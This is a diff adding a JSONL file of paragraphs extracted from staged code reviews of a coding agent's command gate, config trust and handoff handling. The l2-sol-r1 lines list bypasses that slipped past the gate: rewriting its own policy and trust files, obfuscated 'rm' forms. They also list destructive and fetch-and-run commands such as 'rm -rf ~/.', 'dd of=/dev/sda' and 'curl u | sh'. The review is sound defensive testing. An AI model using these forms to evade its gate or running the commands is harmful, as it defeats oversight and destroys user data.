@@ -1,0 +1,367 @@
+{"report":"l1-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**BLOCK: trusted-project corruption still violates “never widens.”** The implemented traversal repair is sound for the tested lexical paths, but does not close "}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"**Substantially satisfied:** `config-normalize.test.mjs` covers block/leaf types, siblings, malformed entries and parse failures; `config-handlers-malformed.tes"}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"**Satisfied for user scope:** `config-gate-fallback.test.mjs` a–e pins in-memory retention, fresh-process stop, planted snapshots, interactive stop, repair and "}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"**Satisfied under the defined predicate:** `config-trust.test.mjs` checks F1, resource evidence, saved folder/parent trust, false/missing APIs, corrupt stores a"}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"**Satisfied:** `config-trust` pins one warning/journal notice, `/trust` guidance, repeat-session notice and no-file silence."}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"**Satisfied:** the bare-harness test pins the unavailable-module state; production import failure closes trust."}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"**Not satisfied generally:** the matrix compares malformed project overrides against the **user baseline**, not against a previously effective restrictive proje"}
+{"report":"l1-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**Source-derived, not executed:** `packages/nana-pack/lib/config.ts:412–426` replaces a malformed trusted-project gate with cached project leaves **or `{}`**."}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"Start with valid user defaults and a nana-trusted project denying `terraform destroy`."}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"Corrupt the project JSON and start a fresh process."}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"No project cache exists; `{}` contributes no deny; `terraform destroy` encounters no built-in restriction and is allowed."}
+{"report":"l1-astra-land","reason":"notes_section","section":"other","text":"Likewise, a project’s explicit `allowPatterns: []` can disappear, reactivating a broader user exception."}
+{"report":"l1-astra-land","reason":"prose","section":"other","text":"The ruled loss of auto-trusted project config is acceptable; `/trust` plus restart is actionable. A fresh-process user-gate typo stopping all four gated classes"}
+{"report":"l1-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**Interactive pi is not inherently one process per session:** installed `agent-session-runtime.js` replaces sessions in-process for new/resume/fork. Last-good m"}
+{"report":"l1-astra-land","reason":"prose","section":"other","text":"L2 can consume the typed gate and `stopReason`; it must preserve stop-before-exception behavior and retain traversal regressions. Its session snapshot is **not "}
+{"report":"l1-astra-land","reason":"prose","section":"other","text":"Approve the declared scope amendments: policy-path protection, its resolver and `gate-policy-paths.test.mjs` directly repair demonstrated trust-forging paths."}
+{"report":"l1-astra-land","reason":"label","section":"must","text":"**MUST**"}
+{"report":"l1-astra-land","reason":"label","section":"carry","text":"**CARRY**"}
+{"report":"l1-astra-land","reason":"label_other","section":"other","text":"**UPSTREAM-CONTRACT DECLARATION:** project config now requires nana-trust; malformed user policy retains process-local last-good or stops; config diagnostics ig"}
+{"report":"l1-astra-r2","reason":"unlabeled_paragraph","section":"none","text":"**Assertion change — legitimate, not weakening.** The replaced assertions required the defective behavior. New assertions require project STOP for malformed gat"}
+{"report":"l1-astra-r2","reason":"label","section":"findings","text":"**NEW defects:** no new behavioral blocker found. Minor documentation drift: `GateConfig.stopReason` still describes user-only failure; `AGENTS.md:143` says mal"}
+{"report":"l1-astra-r2","reason":"label","section":"must","text":"MUST:"}
+{"report":"l1-astra-r2","reason":"label","section":"carry","text":"CARRY:"}
+{"report":"l1-sol-r1","reason":"notes_section","section":"other","text":"**Scope:** All 20 changed files are allowlisted; handoff logic, objective resolution, gate patterns, desk, and `pi-review` are untouched."}
+{"report":"l1-sol-r1","reason":"notes_section","section":"other","text":"**Existing tests:** The 10 listed fixture tests have zero assertion edits. `gate-config-robustness`’s seeded snapshot reflects the replacement no-snapshot-stop "}
+{"report":"l1-sol-r1","reason":"notes_section","section":"other","text":"**Size:** Fixture/docs/test count explains most of the 20 files. The `globalThis` state is justified: the control passed with one evidence resolution/warning/jo"}
+{"report":"l1-sol-r1","reason":"notes_section","section":"other","text":"**Trust probes:** Real pi 0.87.1 passed nana-only ignored, settings honored, folder/parent trust honored, recorded false ignored, and corrupt trust store closed"}
+{"report":"l1-sol-r1","reason":"notes_section","section":"other","text":"**Race:** Planting `.pi/settings.json` after `session_start` did not activate project `postEdit`; the next session start did."}
+{"report":"l1-sol-r1","reason":"notes_section","section":"other","text":"**Malformed shapes:** Prototype keys, invalid regex, non-UTF8, directory, `/dev/null` symlink, zero-byte file, and 100k regex entries never threw. Prototype rem"}
+{"report":"l1-sol-r1","reason":"notes_section","section":"other","text":"**Documentation:** The changed policy appears in `packages/nana-pack/README.md:112-126`, `templates/_shared/working-under-nana-pi.md:66`, and `packages/nana-pac"}
+{"report":"l1-sol-r1","reason":"notes_section","section":"other","text":"**Compatibility:** Desk GET/POST remains a raw write/read round trip; normalization affects runtime consumption only. `nana-setup project` still seeds the same "}
+{"report":"l1-sol-r3","reason":"attached_as_body","section":"none","text":"However, lexical traversal bypasses the raw-string regex for both tools:"}
+{"report":"l1-sol-r3","reason":"attached_as_body","section":"none","text":"**Legitimate flows:** no break found. Desk and `nana-setup project` write outside pi tool calls. A mocked interactive probe confirmed “Allow once” permits all s"}
+{"report":"l2-astra-land","reason":"unlabeled_paragraph","section":"none","text":"**Independent land ruling: BLOCK on one bounded floor regression, not another shell-text arms race.**"}
+{"report":"l2-astra-land","reason":"prose","section":"none","text":"Read the ordered corpus, complete patch, candidate code/tests, architecture contract and L3 brief. Runtime results below are seat/sol evidence; I did not rerun "}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**(a) Satisfied as amended by A/C, not as originally universal.** `gate-self-protection.test.mjs` covers resolved edit/write paths, aliases, literal Bash/PowerS"}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**(b) Satisfied with the inherited repair exception.** `gate-survives-mutation.test.mjs` steps 1–5, fresh-process 4b and STOP→repair→reload pin the ratchet, fal"}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**(c) Satisfied for the declared scanner.** `gate-corpus.test.mjs` compound and unsegmentable groups pin segment-local exceptions and conservative rejection of "}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**(d) NOT satisfied.** Existing floor/normalization cases pass, but the final stdin change introduces the bypass below."}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**(e) Satisfied for the required corpus.** BUILTINS/L2_BLOCK/ALLOW and interactive cases cover dangerous forms, benign controls, default Block and Allow once. T"}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**(f) Satisfied.** Mutation step 6 checks empty-matching rejection, warning and journal; reload confirms rejected patterns remain ineffective."}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**(g) Satisfied for the intended ordinary-file examples.** Self-protection PATHS_ALLOW covers notes and handoffs; `gate-status.test.mjs` pins ungated reads. Thi"}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**Coverage limits:** native Windows behavior is not executed; the “composed” trust regression only checks rejected writes, not subsequent fresh-policy consumpti"}
+{"report":"l2-astra-land","reason":"prose","section":"other","text":"L1+L2 now supply the positive/negative corpus, compounds, literal shell/PowerShell mutation checks, aliases, corruption/restart STOP, missing defaults, external"}
+{"report":"l2-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**Row “1 + 2” is substantially covered, but cannot receive an unqualified pass while the floor regression remains.**"}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**A: uphold.** Narrowing the claim beats endless text-pattern additions. The sandbox must constrain the whole process and post-edit children, not merely built-i"}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**C: uphold.** Project Claude settings/hooks execute code; their declared protection is justified. Ordinary `.claude` content is not blanket-blocked."}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**E: uphold subtraction.** No watchdog/probe is preferable to false timing guarantees. However, 64 KB limits **exception eligibility**, not deny-regex subjects "}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**F/G: uphold.** Invalid/excess denies retain last-good or STOP; never silently discard protection. Same-session `postEdit.commands` execution is now correctly "}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**Keep STOP absolute:** no repair exception through gated tools. Owner recovery is “edit the named file with any editor outside pi, or delete it—missing means d"}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"Accept >200-pattern migration lockout and trusted-project availability loss with explicit recovery documentation. The “previously first 200” behavior describes "}
+{"report":"l2-astra-land","reason":"notes_section","section":"other","text":"**Accumulated policies: narrow the claim, no truncation fix.** Re-capping by dropping denies would violate the ratchet. Document 200 per source list/load, with "}
+{"report":"l2-astra-land","reason":"prose","section":"other","text":"README Gate/Config, `AGENTS.md`, config/gate headers and the actual desk label mostly declare the new contract correctly."}
+{"report":"l2-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**L3:** no semantic conflict. Handoff edits are explicitly allowed absent STOP/custom denies; preserve that test when merging its additive `staleAfterDays` sche"}
+{"report":"l2-astra-land","reason":"label","section":"must","text":"MUST:"}
+{"report":"l2-astra-land","reason":"label","section":"carry","text":"CARRY:"}
+{"report":"l2-astra-land","reason":"label_other","section":"other","text":"UPSTREAM-CONTRACT DECLARATION: segment-local exceptions; recognized floor before exceptions; gate loosening at session start/reload; tightening live; last-good-"}
+{"report":"l2-astra-r2","reason":"attached_as_body","section":"none","text":"Bounds and interpreter residual: `packages/nana-pack/README.md:229–245`."}
+{"report":"l2-astra-r2","reason":"attached_as_body","section":"none","text":"Both-scope external repair/deletion recovery: that README `:143–147` and `AGENTS.md:150–154`."}
+{"report":"l2-astra-r2","reason":"attached_as_body","section":"none","text":"Published label: `apps/desk/README.md:235–237`, matching `apps/desk/public/app.js:2120`."}
+{"report":"l2-astra-r2","reason":"unlabeled_paragraph","section":"none","text":"**Option-position assessment:** The deliberate strictness does produce ordinary false positives: `cat data.json | python3 -m json.tool -` is floor although stdi"}
+{"report":"l2-astra-r2","reason":"prose","section":"none","text":"`--` does not defeat explicit indicators: scanning stops there, but the independent indicator scan does not. Bare `bash --` remains floor; `python3 -- --version"}
+{"report":"l2-astra-r2","reason":"label","section":"must","text":"MUST:"}
+{"report":"l2-astra-r2","reason":"label","section":"carry","text":"CARRY: Conservative stdin false positives; incomplete interpreter-option modelling; uncapped deny accumulation, regex/large-command work; computed policy-path m"}
+{"report":"l2-sol-r1","reason":"prose","section":"other","text":"The lane is materially over appetite: **10 files, +1,066/−106 LOC**, including roughly **574 added gate-code lines** versus the contract’s 150–250 estimate."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"**`nana-gate.ts`**: session baselining, live tightening, stop handling, journaling, and floor-before-allow ordering are load-bearing for (b), (d), and (f)."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"**`lib/gate-paths.ts` (138 LOC)**: lexical resolution and policy-file recognition are load-bearing. Realpath/symlink handling and alternate agent-dir support ar"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"**`lib/gate-shell.ts` (261 LOC)**:"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"**18 unsegmentable constructs**:"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"**Stop lifts live on repair:** accepted; required by unchanged L1 fallback behavior. Repaired allow patterns still wait for session start."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"**Project `.claude/**`:** reject as unapproved scope expansion. Security-motivated, but it changes headless project workflows beyond the specified `~/.claude/**"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"**`config.ts`:** verified comments/types only; no logic changed."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"**Desk README:** contradictory instructions existed. The note is harmless documentation, but it belonged to the seat."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"Verified byte-unchanged assertions/tests: `gate-status`, `gate-config-robustness`, `gate-policy-paths`, `config-gate-fallback`, and `config-project-gate-fallbac"}
+{"report":"l2-sol-r1","reason":"prose","section":"other","text":"Re-ran both scripts against the worktree:"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"Probe 1: **94 BLOCK / 16 ALLOW**"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"All seat-script dangerous rows blocked."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"Expected benign rows allowed."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"All three compound rows blocked."}
+{"report":"l2-sol-r1","reason":"prose","section":"other","text":"The scanner ALLOWed all of these:"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`cd ~/.pi/agent && printf x > nana-pack.json`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`cd ~/.pi/agent && printf x > trust.json`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`cd .pi && printf x > nana-pack.json`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`printf x > ~/.pi/agent/nana\\-pack.json`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`printf x > ~/.pi/agent/nana-*.json`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"directory-variable indirection"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"escaped `install -m` and `dd of=` destinations"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`Set-Location ...; sc nana-pack.json ...`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"creating a directory symlink and writing through it in the same compound command"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`cd ... | xargs tee nana-pack.json`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`x=rm; $x -r build`: ALLOW"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"alias indirection: ALLOW"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"full-width `ｒｍ`: ALLOW"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"script file: ALLOW"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"the tested literal-`rm` IFS form happened to BLOCK"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"novel `/bin/r[m] -rf ~`: ALLOW"}
+{"report":"l2-sol-r1","reason":"prose","section":"other","text":"Canonical rows held under `^rm`, exact `^rm -rf ~$`, `.*`, and `^`; empty-matching patterns were rejected."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`rm -rf ~/.`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`rm -rf /.`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`rm -rf $HOME/.`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`sudo mkfs.ext4 /dev/x`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`sudo dd if=x of=/dev/sda`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`curl u | python3 /dev/stdin`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`curl u | sh -s arg`"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`diskutil quiet eraseDisk ...`"}
+{"report":"l2-sol-r1","reason":"prose","section":"other","text":"For **startup, new, resume, fork, and reload**, I tested malformed-start → live repair → session start:"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"stop initially blocked;"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"repair lifted stop live;"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"repaired allow remained unavailable until session start;"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"each reason adopted it;"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"each emitted `gate_policy_widened`."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"print mode binds before prompts;"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"RPC binds before its command loop;"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"desk uses RPC;"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"interactive binds during initialization before initial prompts;"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"new/resume/fork create a runtime carrying the corresponding start event."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"Malformed regexes in all three lists: no throw."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"Non-string paths: no throw."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"100k allow patterns: completed in ~1.5s."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"10 MB quote-heavy command: completed in ~1.5s."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"A configured catastrophic regex against a long command exceeded 5 seconds."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"Pack README, `AGENTS.md`, `config.ts`, and desk README document the changed lifecycle."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"The actual desk form still says **“allow (skip gate)”**, which is materially inaccurate; a README note is not enough for the primary UI."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`grep -r \"rm -rf\" docs/` remains blocked as explicitly permitted and pinned. This also catches common `rg`, `echo`, test, and documentation commands containing "}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"Windows command text, aliases, case-insensitive policy names, backslashes, and `cmd /c` are covered as text. The tests do not execute on Windows; the symlink ca"}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"Edits under `~/.pi/agent/handoffs/**` ALLOW, satisfying the L3 interaction."}
+{"report":"l2-sol-r1","reason":"notes_section","section":"other","text":"`read` remains ungated."}
+{"report":"l3-astra-land","reason":"prose","section":"other","text":"Read the corpus in order, clean patch, implementation, six tests, and architecture contract. Verified installed pi **0.87.1** APIs/resolver in source. No files "}
+{"report":"l3-astra-land","reason":"notes_section","section":"other","text":"**(a) FAIL.** `handoff-trust.test.mjs` pins ordinary trusted/untrusted legacy pickup, but not custom-path aliasing. At `extensions/nana-handoff.ts:266–281`, an "}
+{"report":"l3-astra-land","reason":"notes_section","section":"other","text":"**(b) Mostly satisfied.** `handoff-store.test.mjs` pins canonical keys, recorded cwd, sibling/worktree separation and failed-write preservation; `handoff-artifa"}
+{"report":"l3-astra-land","reason":"notes_section","section":"other","text":"**(c) Satisfied for injected summaries, with declared degradations.** `handoff-staleness.test.mjs` pins label, writer, timestamp and precedence. `handoff-store."}
+{"report":"l3-astra-land","reason":"notes_section","section":"other","text":"**(d) Satisfied under the seat amendments.** Staleness tests pin threshold/reset, complete long locators, literal `~`, leading `@`, process-relative custom path"}
+{"report":"l3-astra-land","reason":"notes_section","section":"other","text":"**(e) Satisfied within extension scope.** `handoff-writer-role.test.mjs` pins byte preservation, suppressed pickup and journals, plus the real launcher with a s"}
+{"report":"l3-astra-land","reason":"notes_section","section":"other","text":"**(f) Satisfied.** `handoff-store.test.mjs` pins resume/fork/reload suppression and `/new` pickup."}
+{"report":"l3-astra-land","reason":"notes_section","section":"other","text":"**(g), amended: satisfied on tested paths.** Store tests pin ancestor pointer without text, silence without an ancestor, and worktree separation. L5 adoption cl"}
+{"report":"l3-astra-land","reason":"orphan_continuation","section":"other","text":"| Surface | Covered | Limits |"}
+{"report":"l3-astra-land","reason":"orphan_continuation","section":"other","text":"|---|---|---|"}
+{"report":"l3-astra-land","reason":"orphan_continuation","section":"other","text":"| Handoff injection | Trusted/untrusted legacy defaults; exact root/nested/worktree separation; stale-text suppression; reviewer marker; resume/fork/reload; cus"}
+{"report":"l3-astra-land","reason":"orphan_continuation","section":"other","text":"| Persistence/reachability | POSIX failed writes preserve prior bytes; complete ordinary stale locators; explicit escaped locators | SIGKILL/power loss untested"}
+{"report":"l3-astra-land","reason":"prose","section":"other","text":"Default-store symlink acceptance is the approved subtraction, not a defect itself. Custom refusal remains advisory/TOCTOU-sensitive."}
+{"report":"l3-astra-land","reason":"prose","section":"other","text":"The-hive and basketball-geek intentionally lose automatic repo-summary injection. The warning adequately identifies the surviving source, but “handoff lives in "}
+{"report":"l3-astra-land","reason":"prose","section":"other","text":"`extensions/nana-handoff.ts:101–105` maps **every ENOENT** to `missing`. A dangling default-store entry, or dangling `handoffs/` symlink, produces ENOENT despit"}
+{"report":"l3-astra-land","reason":"prose","section":"other","text":"AGENTS expansion, config matrix addition, default-symlink subtraction and fresh `Source:` escaping were declared. The approved assertion removals have valid rea"}
+{"report":"l3-astra-land","reason":"prose","section":"other","text":"L2’s `tests/gate-self-protection.test.mjs:56–76` explicitly allows handoff-store edits/writes and shell redirection. L3’s config change is one additive leaf wit"}
+{"report":"l3-astra-land","reason":"label","section":"must","text":"**MUST**"}
+{"report":"l3-astra-land","reason":"label","section":"carry","text":"**CARRY — priced by cost of error**"}
+{"report":"l3-astra-land","reason":"label_other","section":"other","text":"**Upstream-contract declaration:** This replaces nana’s repo-local continuity contract, not pi’s API. Accept the declared storage, staleness, role, symlink and "}
+{"report":"l3-astra-r2","reason":"prose","section":"other","text":"Paths below are relative to `~/nana-pi-wt/l3/packages/nana-pack/`."}
+{"report":"l3-astra-r2","reason":"notes_section","section":"other","text":"**Keeping both additions is correct.** `lib/config.ts:135–144,201,257` preserves the positive-number validator and L2’s cap/fatality distinction."}
+{"report":"l3-astra-r2","reason":"notes_section","section":"other","text":"Invalid `handoff.staleAfterDays` produces a **handoff** diagnostic, excluded by the gate-only predicate; it falls back to default/user value without poisoning g"}
+{"report":"l3-astra-r2","reason":"notes_section","section":"other","text":"Allow-list overflow alone remains nonfatal; deny/protected-list overflow and other gate errors remain fatal. No semantic merge regression found."}
+{"report":"l3-astra-r2","reason":"label","section":"must","text":"MUST: []"}
+{"report":"l3-astra-r2","reason":"label","section":"carry","text":"CARRY:"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Scope:** 12 files and +735/−191 exceed the advisory appetite, but 11 files are directly listed by the brief and `config-normalize.test.mjs` is required by the"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Assertion adaptations:** `handoff-artifact.test.mjs` removes exactly the three `.gitignore` assertions and the deletion assertion with the specified rationale"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Restricted edits:** `config.ts` changes only `staleAfterDays` field/default/validator/schema. `pi-review.mjs` changes only child spawn environment plus its co"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Attack probes:** repo `Cwd:` spoof text was not injected. A repo symlink to the current keyed store was not dereferenced through the repo path; legitimate sto"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Store probes:** ten concurrent OS processes produced one complete 50 KB summary with no temp litter. A directory at the store-file path caused no throws and j"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Compatibility grep:** desk only reads/writes handoff config fields and preserves unknown leaves through object spread; nana-setup and pack skills do not consu"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Existing artifacts:** active files exist in `~/the-hive/.pi/handoff.md` and `~/basketball-geek/.pi/handoff.md`, plus archived/probe copies. A temp-HOME startu"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Win32:** case folding is present; temp-plus-rename is present; the README honestly labels NTFS replacement atomicity unverified. Relevant POSIX-only probes ar"}
+{"report":"l3-sol-r1","reason":"notes_section","section":"other","text":"**Config:** default 7 is present; `0`, `-1`, and `Infinity` reject and fall back correctly, with user/project matrix coverage."}
+{"report":"l3-sol-r2","reason":"prose","section":"none","text":"Reviewed `3996c98` + `a5c05ca`; only targeted probes under a temporary `HOME`."}
+{"report":"l3-sol-r2","reason":"label","section":"findings","text":"**NEW / remaining fold defects**"}
+{"report":"l3-sol-r2","reason":"label","section":"carry","text":"**CARRY for astra**"}
+{"report":"l3-sol-r3","reason":"unlabeled_paragraph","section":"none","text":"**R2 disposition**"}
+{"report":"l3-sol-r3","reason":"label","section":"findings","text":"**NEW**"}
+{"report":"l3-sol-r3","reason":"label","section":"carry","text":"**CARRY for astra**"}
+{"report":"l4-sol-r1","reason":"notes_section","section":"other","text":"**A:** Otherwise PASS. Discovery is deterministic and filesystem-based; execution is serial via `process.execPath --experimental-strip-types`; each executed fil"}
+{"report":"l4-sol-r1","reason":"notes_section","section":"other","text":"**C:** PASS. The regular-file detail no longer contradicts ✓ (`doctor.mjs:51-61`). The absent-file advice is accurate because install seeds the example through "}
+{"report":"l4-sol-r1","reason":"notes_section","section":"other","text":"**E:** `doctor-detail.test.mjs` mostly asserts invariants, not implementation strings; only the symlink string is exact as required (`doctor-detail.test.mjs:38-"}
+{"report":"l4-sol-r2","reason":"notes_section","section":"other","text":"`study-tasks.test.mjs:20-22` is an acceptable declared prerequisite for the complete study pre-flight: the test validates the external extension and lockfile pi"}
+{"report":"l4-sol-r2","reason":"notes_section","section":"other","text":"The argv guard is valid for the on-disk `blocked` assertion, but its three structural checks are scoped too broadly, as noted above."}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"**Desk session parsing — unchanged:** `apps/desk/pi-session.mjs:54-58` imports the public root exports `parseSessionEntries`, `migrateSessionEntries`, and `CURR"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"**Desk CLI/RPC — unchanged:** `apps/desk/server.mjs:359-390` relies on `--mode rpc`, session/trust/tool/resource flags, strict JSONL, RPC responses, `extension_"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"**Desk session entries — changed and handled:** 0.86 adds persisted system-role messages and `usage`; 0.87 adds `context_edit`. The diff handles these in the tr"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"**Bench CLI/event stream — changed and handled:** `--mode json`, `message_end`, `agent_end`, `agent_settled`, retry/compaction/tool events, and JSONL framing re"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"**Bench imports — unchanged:** `ModelRuntime` from the coding-agent root and `calculateCost`/`Usage` fields from pi-ai’s root remain public. Usage field names u"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"**Pack extensions — unchanged:** `ExtensionAPI`, `tool_call`, `tool_result`, `session_start`, compaction events, `session_shutdown`, `before_agent_start`, `agen"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"**Breaking changes not consumed:** no nana-pi use of `TranscriptContext`, custom-provider `streamSimple`, `context`, `context_with_system`, `shouldStopAfterTurn"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"Leaving both `PI_MIN_VERSION` constants at 0.84.4 is reasonable: they are compatibility floors for unchanged exports, not the currently tested/pinned runtime."}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"Keeping completed studies pinned to 0.84.4 is also correct scientifically. Editing an existing study’s pin would change its fingerprint and mix experiments. The"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"Root `README.md:49,55` remains stale as already noted for the seat. `README.md:212` is explicitly historical (“at repo creation”), so it need not change."}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"The running desk is temporarily hybrid: its in-memory parser is 0.84.4, while newly spawned children execute the replaced 0.87.1 binary. The old parser is permi"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"Ran `node --experimental-strip-types apps/desk/test/pi-087-entries.test.mjs`: **11/11 passed**."}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"The fixture is genuine `SessionManager`-serialized JSONL, not hand-written JSONL. However, the system message is supplied synthetically through generic `appendM"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"With the filtering line mentally removed, four checks fail: the three hidden-type checks and branch-equality-minus-hidden. Usage is tested both mid-branch and a"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"Active-branch tracing is sound: `apps/desk/server.mjs:1094-1117` indexes every entry and chooses the final non-header entry as leaf before filtering rendered en"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"Cache-warm accounting does not double-count: pi’s warmer persists a standalone usage entry and does not emit that request as an assistant `message_end`. The six"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"The `subagent-render` failure has no plausible direct path from this diff: it uses a stub, `sessionFile:null`, and never reaches transcript parsing or a real ca"}
+{"report":"u-sol-r1","reason":"notes_section","section":"other","text":"Stdin paths are safe:"}
+{"report":"u-sol-r2","reason":"label","section":"findings","text":"**New fold defects:** none."}
+{"report":"u-sol-r2","reason":"label","section":"carry","text":"**Land residuals:** clean up the two remaining absolute TUI comments; restart the live desk service; document the old-study reproduction versus fork/re-pin path"}
+{"report":"t2a-astra-land","reason":"prose","section":"none","text":"There is also a new runtime-contract mismatch: the hook now invokes a `.ts`-importing CLI without a strip-types flag, whose header requires Node ≥22.18, while `"}
+{"report":"t2a-astra-land","reason":"prose","section":"other","text":"Read the corpus in order, then the patch, implementation, tests and consumer declarations. Read-only: I did not rerun tests; **70 files / 3498 checks / exit 0**"}
+{"report":"t2a-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**A — Substantially satisfied, with limits.**"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"`lib/objective.ts` is the single resolver/renderer; CLI and pi are adapters. The golden comparison now removes **only** the hook tag, with independent expected-"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Unconditional walk-up, umbrella fallback, user-relative `objective.path`, rename-only `projectFile`, both program lines, precedence and no duplicate umbrella ar"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Only marker-bearing physical lines survive; independent 1500-unit content caps, 320-unit displayed paths and a 12000-unit block bound are enforced. UTF-8 bounda"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"No-lines governance wording is corrected. The old umbrella-priority-omission assertion was properly replaced, not merely relaxed."}
